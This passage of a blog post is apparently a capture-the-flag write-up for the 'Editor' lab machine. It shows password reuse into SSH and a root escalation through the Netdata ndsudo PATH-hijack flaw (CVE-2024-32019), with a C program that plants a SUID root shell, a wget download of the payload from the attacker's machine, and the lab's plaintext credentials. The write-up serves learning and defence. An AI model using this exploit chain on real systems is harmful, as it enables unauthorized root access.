+tcp    LISTEN  0       50       [::ffff:127.0.0.1]:8079                 *:*      users:((&#34;java&#34;,pid=1067,fd=41))                                                
+tcp    LISTEN  0       50                        *:8080                 *:*      users:((&#34;java&#34;,pid=1067,fd=43)) 
+</code></pre><p>Some more interesting ports are there too. To keep in mind to portforward during post exploitation.</p>
+<h4 id="database-access">Database access<a hidden class="anchor" aria-hidden="true" href="#database-access">#</a></h4>
+<p>Using the discovered credentials, I successfully authenticated to the local MySQL service:</p>
+<p><code>mysql -h 127.0.0.1 -P 3306 -u xwiki -p'theEd1t0rTeam99'</code></p>
+<blockquote>
+<p>Note: Passing passwords directly via the command line is not recommended in real-world environments, but is commonly used in CTF-style labs.</p>
+</blockquote>
+<p>So I found nothing.
+The password that I found, seems more like a user password.
+There is a user named <code>oliver</code> and port 22 ssh is also open.
+Checking if &lsquo;password reuse&rsquo; is the case here.
+At this point, I had confirmed that the credentials were valid beyond the application context.</p>
+<h1 id="shell-as-oliver">Shell as Oliver<a hidden class="anchor" aria-hidden="true" href="#shell-as-oliver">#</a></h1>
+<p>Given that SSH was open and a user named oliver existed on the system, I tested for password reuse.</p>
+<p><em>command:</em> <code>ssh oliver@editor.htb</code></p>
+<p>Using the recovered password succeeded, granting SSH access as oliver.</p>
+<pre tabindex="0"><code>hrishi@pwn:~/editor$ ssh oliver@editor.htb #theEd1t0rTeam99
+oliver@editor.htb&#39;s password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Dec 10 11:29:10 AM UTC 2025
+
+  System load:  0.12              Processes:             227
+  Usage of /:   73.6% of 7.28GB   Users logged in:       0
+  Memory usage: 50%               IPv4 address for eth0: 10.10.11.80
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+4 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+4 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Dec 10 11:29:11 2025 from 10.10.14.210
+oliver@editor:~$ 
+</code></pre><h1 id="shell-as-root">Shell as root<a hidden class="anchor" aria-hidden="true" href="#shell-as-root">#</a></h1>
+<h4 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h4>
+<p>The oliver user had no sudo privileges. I continued enumerating the system, focusing on locally running services and third-party software.</p>
+<p>Keepin in mind the locally running ports; I started enumerating directories.</p>
+<p>During directory enumeration, I discovered Netdata installed under /opt.</p>
+<pre tabindex="0"><code>oliver@editor:~$ ls /opt/
+containerd  netdata
+</code></pre><p>Checking it&rsquo;s version and build information. with quick chatgpt help.</p>
+<pre tabindex="0"><code>oliver@editor:~$ /opt/netdata/bin/netdata -W buildinfo
+Packaging:
+    Netdata Version ____________________________________________ : v1.45.2
+---snip---
+</code></pre><h4 id="vulnerability-identification">Vulnerability Identification<a hidden class="anchor" aria-hidden="true" href="#vulnerability-identification">#</a></h4>
+<p>A quick search revealed CVE-2024-32019, affecting Netdata versions prior to 1.45.3.</p>
+<ul>
+<li>CVE: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32019">https://nvd.nist.gov/vuln/detail/CVE-2024-32019</a></li>
+</ul>
+<p>The vulnerability allows local privilege escalation due to a SUID binary (ndsudo) that respects the user-controlled PATH environment variable.</p>
+<p>Inspecting the binary confirmed the SUID bit:</p>
+<pre tabindex="0"><code>oliver@editor:~$ ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+</code></pre><p>So from what I read about and understood about the CVE, is I can exploit in by setting <code>PATH</code> variable.
+Writing an exploit to do that.</p>
+<p>GCC is not installed on the target machine.
+So I will compile and upload it using python server.</p>
+<pre tabindex="0"><code>hrishi@pwn:/tmp$ vim exploit.c
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+
+int main() {
+	setuid(0);
+	seteuid(0);
+	setgid(0);
+	setegid(0);
+	system(&#34;cp /bin/bash /tmp/MeetHrishi; chown root:root /tmp/MeetHrishi; chmod 6777 /tmp/MeetHrishi&#34;):
+}
+</code></pre><pre tabindex="0"><code>hrishi@pwn:/tmp$ gcc exploit.c -o nvme
+hrishi@pwn:/tmp$ ls nvme 
+nvme
+</code></pre><p>Further i compiled and uploaded the exploit naming it as <code>nvme</code>.</p>
+<pre tabindex="0"><code>oliver@editor:/tmp$ wget 10.10.15.129:/nvme
+--2025-12-10 12:02:09--  http://10.10.14.129/nvme
+Connecting to 10.10.14.129:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16136 (16K) [application/octet-stream]
+Saving to: ‘nvme’
+
+nvme                          100%[==============================================&gt;]  15.76K  11.9KB/s    in 1.3s    
+
+2025-12-10 12:02:11 (11.9 KB/s) - ‘nvme’ saved [16136/16136]
+
+oliver@editor:/tmp$ chmod +x nvme
+</code></pre><p>Now I will run the <code>ndsudo</code> with /tmp as my path set.</p>
+<pre tabindex="0"><code>oliver@editor:/tmp$ PATH=/tmp:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+</code></pre><p>It will not emit any output but checking the /tmp directory for <code>MeetHrishi</code>:</p>
+<pre tabindex="0"><code>oliver@editor:/tmp$ ls -l MeetHrishi 
+-rwsrwsrwx 1 root root 1396520 Dec 10 12:04 MeetHrishi
+</code></pre><p>I will now run it and get root access on the machine.</p>
+<pre tabindex="0"><code>oliver@editor:/tmp$ ./MeetHrishi -p
+MeetHrishi-5.1# whoami
+root
+MeetHrishi-5.1# cat /root/root.txt
+ac40de9574f78b3b85c0d26aa972b5fd
+MeetHrishi-5.1# 
+</code></pre><h1 id="final-notes">Final Notes<a hidden class="anchor" aria-hidden="true" href="#final-notes">#</a></h1>
+<ul>
+<li>
+<p>Clear service version disclosure greatly simplified exploitation.</p>
+</li>
+<li>
+<p>Password reuse allowed straightforward lateral movement.</p>
+</li>
+<li>
+<p>Third-party monitoring tools often introduce unexpected privilege escalation paths.</p>
+</li>
+<li>
+<p>SUID binaries combined with environment variable misuse remain a high-impact weakness.</p>
+</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://meethrishii.github.io/">MeetHrishi</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
